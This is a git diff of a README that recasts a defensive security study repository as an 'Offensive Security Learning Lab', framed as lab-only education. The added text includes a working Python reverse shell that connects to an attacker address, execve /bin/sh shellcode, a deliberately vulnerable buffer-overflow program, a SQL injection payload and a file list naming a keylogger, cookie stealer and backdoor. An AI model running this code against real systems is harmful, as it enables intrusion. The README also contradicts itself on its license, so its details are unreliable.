@@ -1,659 +1,741 @@
-# Defensive Security Through Offensive Understanding
+# Offensive Security Learning Lab
 
-![Security Research](https://img.shields.io/badge/Focus-Defensive%20Security-blue)
-![License](https://img.shields.io/badge/License-CC%20BY--NC%204.0-lightgrey)
-![Status](https://img.shields.io/badge/Status-Active%20Learning-green)
+[![Security Research](https://img.shields.io/badge/Purpose-Educational%20Only-brightgreen)](https://github.com/yourusername/offensive-security-lab)
+[![License](https://img.shields.io/badge/License-CC%20BY--NC%204.0-lightgrey)](LICENSE)
+[![Python](https://img.shields.io/badge/Language-Python-blue)](https://www.python.org/)
+[![Made with Love](https://img.shields.io/badge/Made%20with-%E2%9D%A4-red)](https://github.com/yourusername)
 
----
+> **"To catch a hacker, you must think like a hacker."**
 
-## 🎓 About This Repository
-
-This is my personal learning laboratory for understanding security vulnerabilities and attack patterns from a **defender's perspective**. By studying how systems can be compromised in controlled environments, I'm building the knowledge needed to:
-
-- Design more secure applications
-- Identify vulnerabilities before they're exploited
-- Implement effective security controls
-- Think critically about system architecture
-- Pursue a career in cybersecurity defense
-
-**Core Philosophy**: Understanding attack mechanics is essential for effective defense. This repository documents that learning journey.
+A comprehensive repository documenting my journey into offensive security, malware analysis, and penetration testing — all for the purpose of becoming a better defender.
 
 ---
 
-## ⚖️ Legal & Ethical Framework
+## ⚠️ LEGAL DISCLAIMER
 
-### Personal Learning Commitment
-
-All activities documented here occur **exclusively** in my personal, isolated lab environment on systems I own. This work is:
-
-- ✅ Conducted on virtual machines I control
-- ✅ Isolated from production networks
-- ✅ For educational and defensive purposes only
-- ✅ Documented to reinforce learning
-- ❌ Never applied to systems without authorization
-- ❌ Not intended for malicious use
-
-### Responsible Use
-
-I understand that:
-- Unauthorized computer access is illegal under laws like the CFAA, Computer Misuse Act, and similar legislation worldwide
-- These techniques must only be used on systems I own or have written authorization to test
-- With security knowledge comes ethical responsibility
-- The goal is always to strengthen defenses, never to harm
+```
+┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃                    FOR EDUCATIONAL PURPOSES ONLY                          ┃
+┃                                                                            ┃
+┃  All content in this repository is strictly for authorized testing and    ┃
+┃  educational purposes. Unauthorized access to computer systems is         ┃
+┃  illegal. Use this knowledge responsibly and ethically.                   ┃
+┃                                                                            ┃
+┃  By accessing this repository, you agree to use it only on systems you    ┃
+┃  own or have explicit written permission to test.                         ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+```
 
 ---
 
-## 📋 Contents
+## 📖 Table of Contents
 
-- [Why This Approach?](#-why-this-approach)
-- [My Lab Setup](#-my-lab-setup)
-- [Learning Path](#-learning-path)
-- [Repository Organization](#-repository-organization)
-- [Technologies & Languages](#-technologies--languages)
-- [Study Modules](#-study-modules)
-- [Tools I'm Learning](#-tools-im-learning)
-- [Getting Started](#-getting-started)
-- [Documentation Approach](#-documentation-approach)
-- [Resources & References](#-resources--references)
-- [Progress Tracking](#-progress-tracking)
-
----
-
-## 🤔 Why This Approach?
-
-### The Defender's Mindset
-
-To effectively protect systems, I need to understand:
-
-| Understanding | Application |
-|---------------|-------------|
-| **Attack Vectors** | Design secure architectures that resist common attacks |
-| **Exploitation Techniques** | Recognize vulnerability patterns in code review |
-| **Post-Compromise Behavior** | Build detection mechanisms for intrusion attempts |
-| **Attacker Tools** | Understand what attackers see and how to hide it |
-| **Evasion Methods** | Create more robust security controls |
-
-### Learning Through Practice
-
-Reading about vulnerabilities isn't enough. By:
-- **Building** vulnerable systems in my lab
-- **Exploiting** them in controlled conditions
-- **Analyzing** what went wrong
-- **Implementing** fixes and mitigations
-
-I develop intuition that no textbook can provide.
+- [Overview](#-overview)
+- [Lab Environment](#-lab-environment)
+- [Repository Structure](#-repository-structure)
+- [Technologies](#-technologies)
+- [Learning Modules](#-learning-modules)
+- [Setup Guide](#-setup-guide)
+- [Usage](#-usage)
+- [Resources](#-resources)
+- [Contributing](#-contributing)
+- [License](#-license)
 
 ---
 
-## 🖥️ My Lab Setup
+## 🎯 Overview
 
-### Hardware Configuration
+This repository contains:
 
-**Host Machine**:
-- Dell XPS 15 (32GB RAM, 1TB SSD)
-- Dedicated to security research when in lab mode
-- Always offline when running vulnerable VMs
+```yaml
+Purpose:
+  - Understand offensive security techniques
+  - Learn exploitation and malware development
+  - Master penetration testing methodologies
+  - Build defensive capabilities through offensive knowledge
 
-**Physical Test Devices**:
-- 2× Raspberry Pi 4 (network security testing)
-- Retired Android phone (mobile security practice)
-- Old laptop dedicated to testing scenarios
+Scope:
+  - Web Application Security
+  - System Exploitation
+  - Network Penetration Testing
+  - Malware Analysis & Development
+  - Post-Exploitation Techniques
+  - Mobile Security (Android/iOS)
+  - Reverse Engineering
 
-### Virtualization Stack
+Goal: Become a skilled security professional by understanding both attack and defense
+```
 
-**Platform**: VirtualBox 7.0 + VMware Workstation
-**Network Configuration**: 
-- Host-only adapter for isolated testing
-- No bridge to production network
-- Internet access only for attacker VM when needed
+---
+
+## 🖥️ Lab Environment
+
+### Hardware Setup
+
+```bash
+# Host Machine
+- CPU: Intel Core i7 / AMD Ryzen 7
+- RAM: 32GB DDR4
+- Storage: 1TB SSD
+- Network: Isolated testing environment
+
+# Virtual Machines
+- Hypervisor: VirtualBox 7.0 / VMware Workstation
+- Network: Host-only adapter (isolated)
+- Total VMs: 10+ (attacker + targets)
+```
 
 ### Virtual Machines
 
-| VM Name | Purpose | Source |
-|---------|---------|--------|
-| **Kali Linux 2024** | Security testing platform | Official Kali downloads |
-| **Metasploitable 2 & 3** | Intentionally vulnerable targets | Rapid7 |
-| **Windows 10 (Unpatched)** | Windows vulnerability testing | Personal license |
-| **Windows 11 (Updated)** | Modern Windows defenses | Personal license |
-| **Ubuntu Server 22.04** | Linux server security | Ubuntu official |
-| **DVWA** | Web application testing | DVWA project |
-| **OWASP WebGoat** | Web security training | OWASP |
-| **Juice Shop** | Modern web vulnerabilities | OWASP |
+| VM Name | OS | Purpose | Status |
+|---------|----|---------|----|
+| `kali-attacker` | Kali Linux 2024.1 | Primary attack platform | ✅ Active |
+| `metasploitable2` | Ubuntu 8.04 | Vulnerable target | ✅ Active |
+| `metasploitable3` | Ubuntu 14.04/Win2008 | Modern vulnerable target | ✅ Active |
+| `dvwa-server` | Ubuntu 20.04 + DVWA | Web app testing | ✅ Active |
+| `windows10-target` | Windows 10 (unpatched) | Windows exploitation | ✅ Active |
+| `windows11-target` | Windows 11 | Modern Windows defense | ✅ Active |
+| `ubuntu-server` | Ubuntu 22.04 | Linux server testing | ✅ Active |
+| `android-emulator` | Android 13 | Mobile security | 🔄 Testing |
 
-### Safety Measures
+### Network Diagram
 
-- ✅ All target VMs on isolated network
-- ✅ No access to personal data or credentials
-- ✅ Snapshots before every experiment
-- ✅ Host firewall configured
-- ✅ Lab network physically separated from home network
-- ✅ Regular backup of learning notes
+```
+┌─────────────────────────────────────────────────────────────┐
+│                        HOST MACHINE                          │
+│                      (Physical System)                       │
+│                                                               │
+│  ┌──────────────────────────────────────────────────────┐  │
+│  │            VirtualBox Host-Only Network              │  │
+│  │              (192.168.56.0/24)                       │  │
+│  │                                                       │  │
+│  │   ┌─────────────┐    ┌──────────────┐               │  │
+│  │   │ Kali Linux  │    │ Metasploitable│              │  │
+│  │   │ (Attacker)  │───▶│   (Target)    │              │  │
+│  │   │ .56.101     │    │   .56.102     │              │  │
+│  │   └─────────────┘    └──────────────┘               │  │
+│  │         │                    │                       │  │
+│  │         └────────┬──────────┘                       │  │
+│  │                  │                                   │  │
+│  │         ┌────────▼────────┐                         │  │
+│  │         │   DVWA Server   │                         │  │
+│  │         │   .56.103       │                         │  │
+│  │         └─────────────────┘                         │  │
+│  └──────────────────────────────────────────────────────┘  │
+│                                                               │
+│  ⚠️  NO INTERNET ACCESS FOR TARGET VMs                      │
+└─────────────────────────────────────────────────────────────┘
+```
 
 ---
 
-## 📁 Repository Organization
+## 📁 Repository Structure
 
 ```
-defensive-security-lab/
+offensive-security-lab/
 │
-├── README.md                          # This document
-├── LICENSE                            # CC BY-NC 4.0
+├── 📄 README.md                    # You are here
+├── 📄 LICENSE                      # CC BY-NC 4.0
+├── 📄 .gitignore                   # Ignore sensitive files
 │
-├── learning-notes/                    # My study notes
-│   ├── concepts/
-│   │   ├── memory-corruption.md
-│   │   ├── web-vulnerabilities.md
-│   │   └── network-security.md
-│   ├── lab-exercises/
-│   │   ├── buffer-overflow-practice.md
-│   │   ├── sql-injection-labs.md
-│   │   └── xss-exploration.md
-│   └── writeups/
-│       ├── ctf-challenges/
-│       └── vulnerable-app-analysis/
+├── 📂 docs/                        # Documentation
+│   ├── 📂 ethics/
+│   │   ├── legal-boundaries.md
+│   │   └── responsible-disclosure.md
+│   ├── 📂 lab-setup/
+│   │   ├── vm-configuration.md
+│   │   └── network-setup.md
+│   └── 📂 writeups/
+│       ├── dvwa-sql-injection.md
+│       └── buffer-overflow-analysis.md
 │
-├── code-studies/                      # Language-specific learning
-│   ├── python/
-│   │   ├── network-programming/
-│   │   │   ├── port-scanner.py
-│   │   │   └── packet-analysis.py
-│   │   ├── vulnerability-research/
-│   │   └── automation-scripts/
+├── 📂 languages/                   # Code by language
+│   ├── 📂 python/
+│   │   ├── 🐍 port-scanner.py
+│   │   ├── 🐍 reverse-shell.py
+│   │   ├── 🐍 keylogger.py
+│   │   └── 🐍 packet-sniffer.py
 │   │
-│   ├── javascript/
-│   │   ├── browser-security/
-│   │   │   ├── xss-examples/
-│   │   │   └── dom-manipulation/
-│   │   └── secure-coding/
+│   ├── 📂 javascript/
+│   │   ├── 🟨 xss-payloads.js
+│   │   ├── 🟨 csrf-exploit.js
+│   │   └── 🟨 cookie-stealer.js
 │   │
-│   ├── c-cpp/
-│   │   ├── memory-safety/
-│   │   │   ├── vulnerable-programs/
-│   │   │   └── exploitation-study/
-│   │   └── secure-alternatives/
+│   ├── 📂 c/
+│   │   ├── ⚙️ buffer-overflow.c
+│   │   ├── ⚙️ shellcode.c
+│   │   └── ⚙️ format-string-vuln.c
 │   │
-│   ├── sql/
-│   │   ├── injection-patterns/
-│   │   └── secure-queries/
+│   ├── 📂 java/
+│   │   ├── ☕ android-backdoor/
+│   │   └── ☕ deserialization-exploit/
 │   │
-│   └── assembly/
-│       ├── x86-basics/
-│       └── reverse-engineering-practice/
+│   ├── 📂 powershell/
+│   │   ├── 💙 invoke-mimikatz.ps1
+│   │   ├── 💙 persistence.ps1
+│   │   └── 💙 enumeration.ps1
+│   │
+│   └── 📂 assembly/
+│       ├── 🔧 shellcode.asm
+│       └── 🔧 reverse-engineering/
 │
-├── defense-mechanisms/                # Defensive implementations
-│   ├── detection/
-│   │   ├── log-analysis-scripts/
-│   │   ├── signature-development/
-│   │   └── behavioral-detection/
-│   ├── hardening/
-│   │   ├── secure-configurations/
-│   │   └── patch-management/
-│   └── monitoring/
-│       └── security-alerts/
+├── 📂 attack-lifecycle/            # Full attack chains
+│   ├── 01-reconnaissance/
+│   ├── 02-initial-access/
+│   ├── 03-privilege-escalation/
+│   ├── 04-persistence/
+│   ├── 05-lateral-movement/
+│   └── 06-exfiltration/
 │
-├── lab-scenarios/                     # Practice scenarios
-│   ├── reconnaissance/
-│   ├── enumeration/
-│   ├── exploitation/
-│   ├── post-exploitation/
-│   └── defense-testing/
-│
-├── tools-developed/                   # Learning projects
+├── 📂 tools/                       # Custom tools
 │   ├── vulnerability-scanner/
-│   ├── log-analyzer/
-│   └── security-checker/
+│   ├── payload-generator/
+│   └── lab-automation/
 │
-└── scripts/                           # Lab management
-    ├── vm-snapshot.sh
-    ├── network-reset.sh
-    └── lab-setup.sh
+└── 📂 defense/                     # Defensive measures
+    ├── detection-rules/
+    ├── hardening-scripts/
+    └── incident-response/
 ```
 
 ---
 
-## 💻 Technologies & Languages
+## 🔧 Technologies
 
-### Primary Focus Areas
+### Programming Languages
 
-| Technology | Learning Focus | Defensive Application |
-|------------|----------------|----------------------|
-| **Python** | Security automation, tool development | Building security scanners, analysis tools |
-| **JavaScript** | Web security, client-side attacks | Secure web development, XSS prevention |
-| **C/C++** | Memory safety, low-level exploitation | Understanding buffer overflows, secure coding |
-| **SQL** | Database security, injection techniques | Writing secure queries, input validation |
-| **Bash/PowerShell** | System automation, scripting | Security automation, log analysis |
-| **Assembly** | Reverse engineering, malware analysis | Understanding compiled code, debugging |
-| **Java** | Android security, deserialization | Mobile app security, secure Java practices |
+```python
+languages = {
+    "Python": {
+        "usage": "Automation, exploit development, tools",
+        "proficiency": "⭐⭐⭐⭐⭐",
+        "examples": ["Port scanners", "Reverse shells", "Payload generators"]
+    },
+    "JavaScript": {
+        "usage": "Web exploitation, XSS, client-side attacks",
+        "proficiency": "⭐⭐⭐⭐",
+        "examples": ["XSS payloads", "CSRF exploits", "Cookie stealers"]
+    },
+    "C/C++": {
+        "usage": "Memory corruption, buffer overflows, shellcode",
+        "proficiency": "⭐⭐⭐",
+        "examples": ["Buffer overflows", "Format string bugs", "Exploit dev"]
+    },
+    "SQL": {
+        "usage": "Database exploitation, SQL injection",
+        "proficiency": "⭐⭐⭐⭐",
+        "examples": ["Union-based injection", "Blind SQLi", "Time-based SQLi"]
+    },
+    "Bash/PowerShell": {
+        "usage": "Post-exploitation, automation, persistence",
+        "proficiency": "⭐⭐⭐⭐",
+        "examples": ["Enumeration scripts", "Persistence mechanisms"]
+    },
+    "Assembly": {
+        "usage": "Reverse engineering, shellcode development",
+        "proficiency": "⭐⭐⭐",
+        "examples": ["x86/x64 shellcode", "Malware analysis"]
+    }
+}
+```
 
----
+### Tools & Frameworks
 
-## 📚 Study Modules
+```bash
+# Reconnaissance
+$ nmap -sV -sC -oA scan target.com
+$ masscan -p1-65535 target.com --rate=1000
+$ gobuster dir -u http://target.com -w wordlist.txt
 
-### Phase 1: Foundations (Completed)
-- [x] Lab environment setup
-- [x] Basic networking concepts
-- [x] Linux & Windows command line
-- [x] Git and version control
-- [x] Ethical hacking framework
+# Exploitation
+$ msfconsole
+$ searchsploit -t windows
+$ sqlmap -u "http://target.com?id=1" --dbs
 
-### Phase 2: Web Application Security (In Progress)
-- [x] HTTP protocol deep dive
-- [x] SQL injection fundamentals
-- [x] Cross-Site Scripting (XSS)
-- [ ] Cross-Site Request Forgery (CSRF)
-- [ ] Authentication vulnerabilities
-- [ ] Session management
-- [ ] File upload vulnerabilities
+# Post-Exploitation
+$ python3 -m http.server 8080
+$ nc -lvnp 4444
+$ invoke-mimikatz.ps1
 
-### Phase 3: Network Security
-- [ ] TCP/IP protocol analysis
-- [ ] Network reconnaissance
-- [ ] Man-in-the-Middle attacks
-- [ ] Wireless security
-- [ ] Firewall evasion techniques
-
-### Phase 4: System Exploitation
-- [ ] Buffer overflow mechanics
-- [ ] Stack vs heap exploitation
-- [ ] Return-oriented programming (ROP)
-- [ ] Privilege escalation (Linux)
-- [ ] Privilege escalation (Windows)
-
-### Phase 5: Post-Exploitation
-- [ ] Lateral movement techniques
-- [ ] Persistence mechanisms
-- [ ] Data exfiltration methods
-- [ ] Log manipulation
-- [ ] Anti-forensics
-
-### Phase 6: Malware Analysis
-- [ ] Static analysis techniques
-- [ ] Dynamic analysis in sandbox
-- [ ] Behavioral analysis
-- [ ] Reverse engineering tools
-- [ ] Indicator of Compromise (IOC) development
-
-### Phase 7: Mobile Security
-- [ ] Android architecture
-- [ ] APK reverse engineering
-- [ ] iOS security model
-- [ ] Mobile exploitation
-
-### Phase 8: Defense & Detection
-- [ ] Intrusion Detection Systems (IDS)
-- [ ] Security Information and Event Management (SIEM)
-- [ ] Threat hunting methodologies
-- [ ] Incident response procedures
-- [ ] Forensics fundamentals
+# Analysis
+$ wireshark
+$ ghidra
+$ gdb -q binary
+```
 
 ---
 
-## 🛠️ Tools I'm Learning
+## 📚 Learning Modules
 
-### Security Testing Platforms
-- **Kali Linux**: Primary security testing distribution
-- **Parrot OS**: Alternative security-focused OS
-- **BlackArch**: Arch-based penetration testing
+### 🌐 Module 1: Web Application Security
 
-### Reconnaissance & Scanning
-- **Nmap**: Network discovery and security auditing
-- **Masscan**: Fast port scanner
-- **Nikto**: Web server scanner
-- **Gobuster**: Directory/file brute forcing
+```javascript
+const webSecurity = {
+  topics: [
+    "SQL Injection (Union, Blind, Time-based)",
+    "Cross-Site Scripting (Reflected, Stored, DOM)",
+    "Cross-Site Request Forgery (CSRF)",
+    "Server-Side Request Forgery (SSRF)",
+    "XML External Entity (XXE)",
+    "Insecure Deserialization",
+    "File Upload Vulnerabilities",
+    "Authentication Bypass",
+    "Session Hijacking"
+  ],
+  platforms: ["DVWA", "WebGoat", "Juice Shop", "HackTheBox"],
+  status: "IN_PROGRESS"
+};
+```
 
-### Web Application Testing
-- **Burp Suite**: Web vulnerability scanner and proxy
-- **OWASP ZAP**: Open-source web scanner
-- **sqlmap**: Automated SQL injection tool
-- **Postman**: API testing
+### 💻 Module 2: System Exploitation
 
-### Exploitation Frameworks
-- **Metasploit**: Penetration testing framework
-- **Empire/Starkiller**: Post-exploitation framework
-- **Cobalt Strike**: Adversary simulation (study only)
+```c
+// Buffer Overflow Example
+#include <stdio.h>
+#include <string.h>
 
-### Reverse Engineering
-- **Ghidra**: NSA's software reverse engineering tool
-- **IDA Free**: Disassembler and debugger
-- **GDB**: GNU debugger
-- **Radare2**: Reverse engineering framework
-- **x64dbg**: Windows debugger
+void vulnerable_function(char *input) {
+    char buffer[64];
+    strcpy(buffer, input);  // Vulnerable!
+}
 
-### Network Analysis
-- **Wireshark**: Network protocol analyzer
-- **tcpdump**: Command-line packet analyzer
-- **Bettercap**: Network attack and monitoring framework
+int main(int argc, char *argv[]) {
+    if (argc > 1) {
+        vulnerable_function(argv[1]);
+    }
+    return 0;
+}
 
-### Password Cracking
-- **John the Ripper**: Password cracker
-- **Hashcat**: Advanced password recovery
-- **Hydra**: Network login cracker
+/*
+Topics Covered:
+- Stack-based buffer overflows
+- Heap exploitation
+- Format string vulnerabilities
+- Return-oriented programming (ROP)
+- ASLR/DEP bypass techniques
+*/
+```
 
-### Custom Tools (Developing)
-- Security scanner suite
-- Log analysis dashboard
-- Vulnerability tracker
-- Lab automation scripts
+### 🔓 Module 3: Privilege Escalation
+
+```bash
+#!/bin/bash
+# Linux Privilege Escalation Checklist
+
+echo "[+] Checking SUID binaries..."
+find / -perm -4000 -type f 2>/dev/null
+
+echo "[+] Checking for kernel exploits..."
+uname -a
+cat /etc/issue
+
+echo "[+] Checking sudo permissions..."
+sudo -l
+
+echo "[+] Checking for writable /etc/passwd..."
+ls -la /etc/passwd
+
+echo "[+] Checking cron jobs..."
+cat /etc/crontab
+ls -la /etc/cron*
+
+# Topics:
+# - SUID/SGID exploitation
+# - Kernel exploits
+# - Sudo misconfigurations
+# - Cron job abuse
+# - Docker escape
+```
+
+### 🐍 Module 4: Malware Development (Educational)
+
+```python
+#!/usr/bin/env python3
+"""
+Educational Reverse Shell Example
+⚠️ FOR AUTHORIZED TESTING ONLY
+"""
+
+import socket
+import subprocess
+import os
+
+def reverse_shell(attacker_ip, attacker_port):
+    """
+    Connects back to attacker machine
+    USE ONLY IN ISOLATED LAB ENVIRONMENT
+    """
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((attacker_ip, attacker_port))
+        
+        # Redirect stdin, stdout, stderr
+        os.dup2(s.fileno(), 0)
+        os.dup2(s.fileno(), 1)
+        os.dup2(s.fileno(), 2)
+        
+        # Spawn shell
+        subprocess.call(["/bin/sh", "-i"])
+    except Exception as e:
+        print(f"Error: {e}")
+
+# Defensive Detection:
+# 1. Monitor outbound connections to unusual ports
+# 2. Check for suspicious child processes
+# 3. Analyze network traffic patterns
+# 4. Use EDR/XDR solutions
+```
+
+### 📱 Module 5: Mobile Security
+
+```java
+// Android Malicious Permissions Example
+// AndroidManifest.xml
+
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    package="com.example.malicious">
+
+    <!-- Dangerous Permissions -->
+    <uses-permission android:name="android.permission.READ_CONTACTS" />
+    <uses-permission android:name="android.permission.READ_SMS" />
+    <uses-permission android:name="android.permission.SEND_SMS" />
+    <uses-permission android:name="android.permission.CAMERA" />
+    <uses-permission android:name="android.permission.RECORD_AUDIO" />
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+    <uses-permission android:name="android.permission.INTERNET" />
+
+    <!-- Topics Covered:
+         - APK reverse engineering
+         - Android malware analysis
+         - Permission exploitation
+         - Dynamic code loading
+    -->
+</manifest>
+```
+
+### 🔍 Module 6: Reverse Engineering
+
+```assembly
+; Basic x86 Shellcode (Linux execve /bin/sh)
+; NASM Assembly
+
+global _start
+
+section .text
+_start:
+    ; execve("/bin/sh", NULL, NULL)
+    xor eax, eax
+    push eax
+    push 0x68732f2f    ; "hs//"
+    push 0x6e69622f    ; "nib/"
+    mov ebx, esp       ; ebx = "/bin//sh"
+    push eax
+    mov edx, esp       ; edx = NULL (envp)
+    push ebx
+    mov ecx, esp       ; ecx = ["/bin//sh", NULL] (argv)
+    mov al, 11         ; execve syscall number
+    int 0x80           ; invoke syscall
+
+; Compile: nasm -f elf32 shellcode.asm
+; Link: ld -m elf_i386 -o shellcode shellcode.o
+; Extract: objdump -d shellcode
+```
 
 ---
 
-## 🚀 Getting Started
+## 🚀 Setup Guide
 
-### Prerequisites Checklist
+### Prerequisites
 
-**Technical Skills**:
-- [ ] Basic programming (Python recommended)
-- [ ] Command line proficiency (Linux & Windows)
-- [ ] Understanding of networking fundamentals
-- [ ] Version control basics (Git)
+```bash
+# System Requirements
+CPU: 4+ cores
+RAM: 16GB minimum (32GB recommended)
+Storage: 100GB+ free space
+OS: Windows 10/11 or Linux
 
-**Hardware Requirements**:
-- Minimum 16GB RAM (32GB ideal)
-- 100GB+ free disk space
-- Virtualization-capable CPU
-- Stable internet connection
-
-**Software Requirements**:
-- VirtualBox or VMware
+# Software Requirements
+- VirtualBox 7.0+ or VMware Workstation
+- Python 3.9+
 - Git
-- Python 3.8+
-- Text editor (VS Code, Sublime, etc.)
-
-### Setup Process
-
-**1. Clone This Repository**
-```bash
-git clone https://github.com/yourusername/defensive-security-lab.git
-cd defensive-security-lab
+- Text Editor (VS Code, Sublime)
 ```
 
-**2. Review Learning Plan**
+### Installation
+
 ```bash
-# Check out the current study modules
-cat learning-notes/study-plan.md
+# 1. Clone the repository
+git clone https://github.com/yourusername/offensive-security-lab.git
+cd offensive-security-lab
+
+# 2. Install Python dependencies
+pip install -r requirements.txt
+
+# 3. Download vulnerable VMs
+./scripts/download-vms.sh
+
+# 4. Configure isolated network
+./scripts/setup-network.sh
+
+# 5. Create VM snapshots (baseline)
+./scripts/snapshot-vms.sh create baseline
+
+# 6. Verify setup
+./scripts/verify-lab.sh
 ```
 
-**3. Set Up Lab Environment**
-```bash
-# Follow detailed lab setup guide
-./scripts/lab-setup.sh
-```
+### Configuration
 
-**4. Create Initial VM Snapshots**
-```bash
-# Snapshot all VMs in clean state
-./scripts/vm-snapshot.sh create-baseline
-```
+```yaml
+# config.yml
+lab:
+  network:
+    subnet: "192.168.56.0/24"
+    gateway: "192.168.56.1"
+    
+  vms:
+    kali:
+      ip: "192.168.56.101"
+      ram: "4096"
+      cpus: "2"
+    
+    metasploitable2:
+      ip: "192.168.56.102"
+      ram: "1024"
+      cpus: "1"
+    
+    dvwa:
+      ip: "192.168.56.103"
+      ram: "2048"
+      cpus: "2"
 
-**5. Start Learning!**
-```bash
-# Begin with web security fundamentals
-cd learning-notes/lab-exercises/
-cat 01-web-fundamentals.md
+  security:
+    isolated: true
+    internet_access: false
+    snapshot_before_test: true
 ```
 
 ---
 
-## 📝 Documentation Approach
+## 💻 Usage
 
-### Learning Notes Format
+### Quick Start Examples
 
-Every study session is documented with:
+```python
+# Example 1: Port Scanning
+from tools import PortScanner
 
-```markdown
-# [Topic Name] - Study Session
+scanner = PortScanner()
+results = scanner.scan("192.168.56.102", ports=[22, 80, 443])
+print(results)
 
-**Date**: YYYY-MM-DD
-**Duration**: X hours
-**Module**: [Current learning module]
+# Example 2: SQL Injection Testing
+from tools import SQLInjectionTester
 
-## Objective
-What I aimed to learn in this session
+tester = SQLInjectionTester()
+payload = "1' OR '1'='1"
+result = tester.test("http://192.168.56.103/login.php", payload)
 
-## Environment Setup
-- Target VM: [VM name]
-- Tools used: [List]
-- Network config: [Setup details]
+# Example 3: Reverse Shell Handler
+from tools import ReverseShellHandler
 
-## Methodology
-Step-by-step process of what I did
-
-## Findings
-- What worked
-- What didn't work
-- Unexpected behaviors
-
-## Key Learnings
-Main takeaways from this session
-
-## Defensive Insights
-How this knowledge applies to defense:
-- Detection methods
-- Prevention strategies
-- Mitigation techniques
-
-## Questions for Further Study
-Things I don't understand yet
-
-## References
-Resources I used
+handler = ReverseShellHandler(port=4444)
+handler.start()
+print("[*] Listening for incoming connections...")
 ```
 
-### Code Documentation Standards
+### Running Modules
 
-All code includes comprehensive comments:
+```bash
+# Web Application Testing
+cd languages/python/
+python3 web-scanner.py --target http://192.168.56.103
+
+# Buffer Overflow Practice
+cd languages/c/
+gcc -o vulnerable vulnerable.c -fno-stack-protector -z execstack
+python3 exploit.py
+
+# Android APK Analysis
+cd languages/java/android/
+apktool d malicious.apk
+jadx-gui malicious.apk
+```
+
+---
+
+## 📖 Resources
+
+### Books
+- 📕 "The Web Application Hacker's Handbook" - Stuttard & Pinto
+- 📗 "Hacking: The Art of Exploitation" - Jon Erickson
+- 📘 "Practical Malware Analysis" - Michael Sikorski
+- 📙 "Metasploit: The Penetration Tester's Guide" - Kennedy et al.
+
+### Online Platforms
+- 🎯 [HackTheBox](https://hackthebox.eu) - Penetration testing labs
+- 🎯 [TryHackMe](https://tryhackme.com) - Guided learning paths
+- 🎯 [PortSwigger Academy](https://portswigger.net/web-security) - Web security
+- 🎯 [PentesterLab](https://pentesterlab.com) - Hands-on exercises
+
+### Certifications
+- 🏆 OSCP (Offensive Security Certified Professional)
+- 🏆 CEH (Certified Ethical Hacker)
+- 🏆 GPEN (GIAC Penetration Tester)
+- 🏆 eJPT (eLearnSecurity Junior Penetration Tester)
+
+---
+
+## 🤝 Contributing
+
+Contributions are welcome! Please follow these guidelines:
+
+```bash
+# 1. Fork the repository
+# 2. Create a feature branch
+git checkout -b feature/new-exploit-module
+
+# 3. Make your changes
+# 4. Add ethical disclaimers to all code
+# 5. Test in isolated environment
+# 6. Commit with clear messages
+git commit -m "Add: SQL injection bypass techniques"
+
+# 7. Push to your fork
+git push origin feature/new-exploit-module
+
+# 8. Open a Pull Request
+```
+
+### Code Standards
 
 ```python
 """
-Script: [Name]
-Purpose: Learning exercise for [specific concept]
-Date: YYYY-MM-DD
-
-Educational Context:
-- Demonstrates [attack/vulnerability type]
-- Used exclusively in personal lab environment
-- Part of study module: [Module name]
-
-Defensive Application:
-- Helps understand [attack pattern]
-- Informs development of [defensive control]
-- Detection signatures: [List relevant indicators]
-
-⚠️ LAB USE ONLY - Never use on unauthorized systems
+All code must include:
+1. Clear purpose statement
+2. Ethical use disclaimer
+3. Lab environment requirement
+4. Defensive implications
+5. Detection methods
 """
+
+# Example:
+def exploit_function():
+    """
+    ⚠️ EDUCATIONAL ONLY - USE IN LAB ENVIRONMENT
+    
+    Demonstrates [specific vulnerability]
+    
+    Defense: [How to detect/prevent]
+    """
+    pass
 ```
 
 ---
 
-## 📖 Resources & References
+## 📜 License
 
-### Books I'm Using
+```
+MIT License
 
-1. **"The Web Application Hacker's Handbook"** - Stuttard & Pinto
-   - Status: Reading chapters 1-5
-   - Focus: Web vulnerability fundamentals
+Copyright (c) 2024 [Your Name]
 
-2. **"Hacking: The Art of Exploitation"** - Jon Erickson
-   - Status: Completed Part I
-   - Focus: Low-level exploitation
+Permission is hereby granted, free of charge, to any person obtaining a copy
+of this software and associated documentation files (the "Software"), to deal
+in the Software without restriction, including without limitation the rights
+to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+copies of the Software, and to permit persons to whom the Software is
+furnished to do so, subject to the following conditions:
 
-3. **"Practical Malware Analysis"** - Michael Sikorski
-   - Status: On reading list
-   - Focus: Reverse engineering
+The above copyright notice and this permission notice shall be included in all
+copies or substantial portions of the Software.
 
-4. **"The Shellcoder's Handbook"** - Koziol et al.
-   - Status: Reference material
-   - Focus: Advanced exploitation
-
-### Online Courses
-
-- [✓] **PortSwigger Web Security Academy** (Free)
-- [✓] **PentesterLab** (Subscription)
-- [ ] **Offensive Security** - OSCP preparation
-- [ ] **SANS SEC504** - On wishlist
-
-### Practice Platforms
-
-**Currently Active**:
-- **HackTheBox** - Working through Easy boxes
-- **TryHackMe** - Completed 50+ rooms
-- **OverTheWire** - Bandit series completed
-
-**Planned**:
-- Root-Me challenges
-- PicoCTF competitions
-- VulnHub machines
-
-### Community Resources
-
-- **r/netsec** - Daily reading
-- **r/AskNetsec** - Learning from Q&A
-- **OWASP** - Following projects and updates
-- **Security podcasts** - Darknet Diaries, Risky Business
+THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+IMPLIED. USE AT YOUR OWN RISK. UNAUTHORIZED ACCESS IS ILLEGAL.
+```
 
 ---
 
-## 📊 Progress Tracking
+## ⚡ Quick Links
 
-### Current Status (February 2026)
-
-**Overall Progress**: ~30% through planned curriculum
-
-**Completed**:
-- ✅ Lab environment fully configured
-- ✅ Basic web vulnerabilities (SQL, XSS)
-- ✅ Network scanning fundamentals
-- ✅ Linux privilege escalation basics
-
-**In Progress**:
-- 🔄 Advanced web attacks (SSRF, XXE)
